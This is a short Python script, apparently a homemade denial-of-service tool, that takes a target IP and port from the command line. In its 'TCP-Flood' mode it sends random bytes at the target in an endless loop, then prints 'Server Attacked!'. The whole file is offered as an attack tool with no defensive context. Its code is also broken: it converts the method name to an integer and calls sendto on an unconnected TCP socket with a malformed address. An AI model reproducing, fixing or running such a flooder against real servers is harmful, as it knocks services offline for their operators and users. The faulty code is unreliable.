#Made By RyDev007
import socket
import random
import sys
import os

attacklogo = """
Server Attacked!
"""

ip = str(sys.argv[1])
port = int(sys.argv[2])
times = int(sys.argv[3])
method = str(sys.argv[4])

byte1 = random._urandom(2024)
  
def Tcpfl():
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
         addr = (str(ip),int(port),int(times),int(method))
         while True:
             s.sendto(byte1, addr)

if method =="TCP-Flood":
        Tcpfl()

if __name__ == '__main__' :
    os.system("cls")
    print(attacklogo)
